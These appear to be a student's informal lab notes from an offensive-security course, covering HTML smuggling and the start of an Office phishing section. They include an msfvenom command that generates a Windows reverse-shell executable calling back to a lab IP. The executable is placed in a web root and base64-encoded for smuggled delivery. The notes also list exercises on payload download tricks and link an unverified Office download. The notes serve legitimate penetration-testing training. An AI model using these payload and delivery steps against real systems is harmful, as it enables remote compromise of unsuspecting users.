# HTML smuggling

remember to use staged payload instead of non staged ones in meterpreter.

finally used 

```
┌──(kali㉿kali)-[~/codeplay/pen300/book/chapter3]
└─$ sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.6.12 LPORT=4444 -f exe -o /var/www/html/msfstaged.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: /var/www/html/msfstaged.exe
                                                                                                                                                                                                                                 
┌──(kali㉿kali)-[~/codeplay/pen300/book/chapter3]
└─$ base64 /var/www/html/msfstaged.exe

```
check the code : using new_html.html

### 3.1.3.1 Exercises
1. Repeat the HTML smuggling to trigger a download of a Meterpreter payload in a file format 
of your choosing.

2. Modify the smuggling code to also use the window.navigator.msSaveBlob62,63 method to 
make the technique work with Microsoft Edge as well.

The explot works in msedge also without any change.

# phishing with microsoft office

installing microsoft office 2016 from : `https://office-2016.fileplanet.com/download` - not verified.





